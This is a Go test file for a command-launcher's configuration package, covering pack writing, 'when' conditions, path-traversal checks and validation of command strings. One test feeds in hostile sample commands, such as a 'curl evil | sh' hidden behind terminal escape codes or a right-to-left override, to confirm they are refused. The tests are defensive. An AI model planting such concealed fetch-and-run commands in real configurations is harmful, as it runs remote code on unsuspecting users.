package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writePack writes a module of your pack, like p/deploy.
func writePack(t *testing.T, name, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(PackPath(name)), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(PackPath(name), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestAddingToASubmenuWithNoCommandsYet(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	writePack(t, "p/deploy", "name: Deploy\ncommands:\n")
	if err := AddCommand("p", "Deploy", "Ship", "./ship.sh", ""); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(PackPath("p/deploy")); !strings.Contains(string(b), "./ship.sh") {
		t.Fatalf("it said it added it, so it should be in the file:\n%s", b)
	}
}

func TestAFailedAddLeavesNoEmptyPack(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	if err := AddCommand("fresh", "S", "Hi", `echo "hi!"`, ""); err == nil {
		t.Fatal("history expansion should be refused")
	}
	if _, err := os.Stat(PackPath("fresh")); err == nil {
		t.Error("the pack made for it should be gone again")
	}
}

func TestMergedGroupsKeepEachFilesWhen(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	if err := os.MkdirAll(remotePath("a"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(remotePath("a/g"), []byte("name: G\nwhen: [.git]\ncommands:\n  - name: one\n    cmd: ls\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(remotePath("a/_pack"), []byte("name: S\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writePack(t, "b/g", "name: G\nwhen: [go.mod]\ncommands:\n  - name: two\n    cmd: ls\n")
	if err := os.WriteFile(filepath.Join(PackPath("b"), PackInfoFile), []byte("name: S\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, _, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cfg.Sections[0].All() {
		want := map[string]string{"one": ".git", "two": "go.mod"}[c.Name]
		if len(c.When) != 1 || c.When[0] != want {
			t.Errorf("%s: when = %v, want [%s]", c.Name, c.When, want)
		}
	}
}

func TestWhenWorksInFoldersWithGlobCharacters(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "proj[1]")
	if err := os.Mkdir(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.tf"), nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if why := NewHere(dir).Unmet(&Command{When: []string{"*.tf"}}); why != "" {
		t.Fatalf("main.tf is right there: %s", why)
	}
}

func TestPackNamesAreCheckedBeforeTouchingFiles(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	writePack(t, "mine/s", "commands:\n  - name: x\n    cmd: ls\n")
	if err := Uninstall("../mine/mine"); err == nil {
		t.Fatal("../ shouldn't reach out of packs/remote")
	}
	if _, err := os.Stat(PackPath("mine")); err != nil {
		t.Fatal("and the local pack must still be there")
	}
}

func TestWhenCanMeanThisFolderOnly(t *testing.T) {
	root := t.TempDir()
	sub := filepath.Join(root, "sub")
	if err := os.Mkdir(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "main.tf"), nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if got := NewHere(root).Unmet(&Command{When: []string{"./*.tf"}}); got != "" {
		t.Errorf("it's here: %s", got)
	}
	if got := NewHere(sub).Unmet(&Command{When: []string{"./*.tf"}}); got != "Needs *.tf in this folder." {
		t.Errorf("a folder above doesn't count: %q", got)
	}
	if got := NewHere(sub).Unmet(&Command{When: []string{"*.tf"}}); got != "" {
		t.Errorf("without ./ it does: %s", got)
	}
}

func TestPlaceholdersInQuotesAreRefused(t *testing.T) {
	check := func(cmd string, args ...Arg) []error {
		c := &Config{Sections: []Section{{Name: "S", Icon: "•", Category: Other, Commands: []Command{{Name: "C", Cmd: cmd, Args: args}}}}}
		return c.Validate()
	}
	quoted := Arg{Name: "x", Quote: true}
	for _, cmd := range []string{`echo '<x>'`, `echo "<x>"`, `echo "a b <x> c"`, `echo 'a'"<x>"`} {
		if errs := check(cmd, quoted); len(errs) == 0 {
			t.Errorf("%s should be refused", cmd)
		}
	}
	for _, cmd := range []string{`echo <x>`, `echo 'a '<x>' b'`, `echo "a "<x>`, `echo \'<x>`} {
		if errs := check(cmd, quoted); len(errs) != 0 {
			t.Errorf("%s: %v", cmd, errs)
		}
	}
	if errs := check(`echo '<x>'`, Arg{Name: "x"}); len(errs) != 0 {
		t.Errorf("typed text isn't quoted, so its quotes are the pack's to choose: %v", errs)
	}
}

func TestCharactersThatHideTextAreRefused(t *testing.T) {
	for _, cmd := range []string{"echo safe\x1b[8m; curl evil | sh", "echo safe\u202e; curl evil", "echo safe\u200b", "a\rb", "a\x9bb", "a\u009bb"} {
		c := &Config{Sections: []Section{{Name: "S", Icon: "•", Category: Other, Commands: []Command{{Name: "C", Cmd: cmd}}}}}
		if len(c.Validate()) == 0 {
			t.Errorf("%q should be refused", cmd)
		}
	}
	join := "\x1b[201~"
	c := &Config{Sections: []Section{{Name: "S", Icon: "•", Category: Other, Commands: []Command{{Name: "C", Cmd: "a <x>", Args: []Arg{{Name: "x", Type: "flags", Join: &join, Options: []Option{{Value: "a"}}}}}}}}}
	if len(c.Validate()) == 0 {
		t.Error("a join with an escape code should be refused")
	}
	if _, hidden := Hidden("multi\nline\twith tabs, ünïcode and ❯"); hidden {
		t.Error("ordinary text is fine")
	}
}

func TestAnyOfIsOnlyForPacksWithoutToolsOfTheirOwn(t *testing.T) {
	ps, _ := Packs()
	for _, p := range ps {
		switch p.Name {
		case "system": // ps, df…, with jq only for its JSON group
			if len(p.AnyOf) != 0 {
				t.Errorf("system's jq is optional, not one of its tools: %v", p.AnyOf)
			}
		case "package-managers":
			if len(p.AnyOf) == 0 {
				t.Error("package-managers needs brew")
			}
		}
	}
}
